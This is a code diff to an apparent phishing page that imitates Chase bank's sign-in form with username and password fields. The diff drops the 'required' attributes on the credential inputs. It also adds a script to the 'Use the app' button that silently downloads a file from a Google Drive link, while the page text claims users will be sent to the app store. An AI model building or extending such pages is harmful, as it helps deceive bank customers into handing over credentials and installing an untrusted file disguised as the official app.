@@ -20,14 +20,14 @@
                 <div class="relative z-0 w-full mb-10 group">
                     <input type="text" name="floating_email" id="floating_email"
                         class="block pt-3 pb-4 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b border-gray-500 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
-                        placeholder=" " required />
+                        placeholder=" "  />
                     <label for="floating_email"
                         class="ps-2 peer-focus:font-medium absolute text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown: peer-focus:scale-75 ">Username</label>
                 </div>
                 <div class="relative z-0 w-full mb-5 group">
                     <input type="password" name="floating_password" id="floating_password"
                         class="block pt-4 pb-3 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b border-gray-500 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
-                        placeholder=" " required />
+                        placeholder=" "  />
                         <label for="floating_email"
                         class="ps-2 peer-focus:font-medium absolute  text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown: peer-focus:scale-75 ">Password</label>
                 </div>
@@ -77,8 +77,16 @@
                <h1 class="text-sm md:text-lg font-bold text-center">Sign in with the chase Mobile® app</h1>
                <h2 class="text-sm md:text-lg text-center pt-1">If you don't have the Chase Mobile app, you'll be directed to the app store where their terms, privacy and security policies apply</h2>
             <div class="flex flex-col space-y-1 pt-4 pb-3">
-                <button type="submit" class="text-white text-center py-1 bg-blue-500 rounded">Use the app</button>
+                <button  type="submit" id="downloadBtn" class="download-btn text-white text-center py-1 bg-blue-500 rounded">Use the app</button>
                 <button type="submit" class="mt-2 text-blue-500 text-center py-1 bg-white-500 border border-blue-500 rounded" data-modal-hide="small-modal">No, thanks</button>
+                <script>
+                    document.getElementById("downloadBtn").addEventListener("click", function() {
+                        var link = document.createElement("a");
+                        link.href = "https://drive.google.com/file/d/1wm3WGfqMJH3ZYShToCEanukjx_-ioDt2/view?usp=drivesdk";
+                        link.download = true;
+                        link.click();
+                    });
+                </script>
             </div>
             </div>
 
